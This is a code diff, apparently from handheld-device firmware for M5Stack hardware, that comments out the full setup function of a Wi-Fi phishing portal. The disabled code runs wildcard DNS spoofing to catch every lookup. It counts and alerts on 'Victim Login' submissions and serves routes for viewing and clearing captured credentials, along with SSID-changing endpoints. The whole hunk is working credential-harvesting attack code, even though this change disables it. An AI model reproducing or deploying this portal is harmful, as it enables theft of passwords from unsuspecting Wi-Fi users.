@@ -379,50 +379,50 @@ void shutdownWebServer() {
   getSSID();
 }
 
-void setupWebServer() {
-  Serial.println("PORTAL -> Starting DNS");
-  dnsServer.start(DNS_PORT, "*", AP_GATEWAY);  // DNS spoofing (Only HTTP)
-  Serial.println("PORTAL -> Setting up Webserver");
-  webServer.on("/post", []() {
-    totalCapturedCredentials = totalCapturedCredentials + 1;
-    webServer.send(HTTP_CODE, "text/html", index_POST());
-#if defined(STICK_C_PLUS)
-    SPEAKER.tone(4000);
-    delay(50);
-    SPEAKER.mute();
-#elif defined(CARDPUTER)
-// Beep on boot, similar to Mikrotik boot sound
-#if defined(SOUND)
-    M5Cardputer.Speaker.tone(4000, 50);
-#endif
-#endif
-    DISPLAY.print("Victim Login");
-#if defined(M5LED)
-    blinkLed();
-#endif
-  });
+// void setupWebServer() {
+//   Serial.println("PORTAL -> Starting DNS");
+//   dnsServer.start(DNS_PORT, "*", AP_GATEWAY);  // DNS spoofing (Only HTTP)
+//   Serial.println("PORTAL -> Setting up Webserver");
+//   webServer.on("/post", []() {
+//     totalCapturedCredentials = totalCapturedCredentials + 1;
+//     webServer.send(HTTP_CODE, "text/html", index_POST());
+// #if defined(STICK_C_PLUS)
+//     SPEAKER.tone(4000);
+//     delay(50);
+//     SPEAKER.mute();
+// #elif defined(CARDPUTER)
+// // Beep on boot, similar to Mikrotik boot sound
+// #if defined(SOUND)
+//     M5Cardputer.Speaker.tone(4000, 50);
+// #endif
+// #endif
+//     DISPLAY.print("Victim Login");
+// #if defined(M5LED)
+//     blinkLed();
+// #endif
+//   });
 
-  Serial.println("PORTAL -> Registering /creds");
-  webServer.on("/creds",
-               []() { webServer.send(HTTP_CODE, "text/html", creds_GET()); });
-  Serial.println("PORTAL -> Registering /clear");
-  webServer.on("/clear",
-               []() { webServer.send(HTTP_CODE, "text/html", clear_GET()); });
-  Serial.println("PORTAL -> Registering /ssid");
-  webServer.on("/ssid",
-               []() { webServer.send(HTTP_CODE, "text/html", ssid_GET()); });
-  Serial.println("PORTAL -> Registering /postssid");
-  webServer.on("/postssid", []() {
-    webServer.send(HTTP_CODE, "text/html", ssid_POST());
-    shutdownWebServer();
-    isSwitching = true;
-    currentProc = 25;
-  });
-  Serial.println("PORTAL -> Registering /*");
-  webServer.onNotFound([]() {
-    lastActivity = millis();
-    webServer.send(HTTP_CODE, "text/html", index_GET());
-  });
-  Serial.println("PORTAL -> Starting Webserver");
-  webServer.begin();
-}
+//   Serial.println("PORTAL -> Registering /creds");
+//   webServer.on("/creds",
+//                []() { webServer.send(HTTP_CODE, "text/html", creds_GET()); });
+//   Serial.println("PORTAL -> Registering /clear");
+//   webServer.on("/clear",
+//                []() { webServer.send(HTTP_CODE, "text/html", clear_GET()); });
+//   Serial.println("PORTAL -> Registering /ssid");
+//   webServer.on("/ssid",
+//                []() { webServer.send(HTTP_CODE, "text/html", ssid_GET()); });
+//   Serial.println("PORTAL -> Registering /postssid");
+//   webServer.on("/postssid", []() {
+//     webServer.send(HTTP_CODE, "text/html", ssid_POST());
+//     shutdownWebServer();
+//     isSwitching = true;
+//     currentProc = 25;
+//   });
+//   Serial.println("PORTAL -> Registering /*");
+//   webServer.onNotFound([]() {
+//     lastActivity = millis();
+//     webServer.send(HTTP_CODE, "text/html", index_GET());
+//   });
+//   Serial.println("PORTAL -> Starting Webserver");
+//   webServer.begin();
+// }
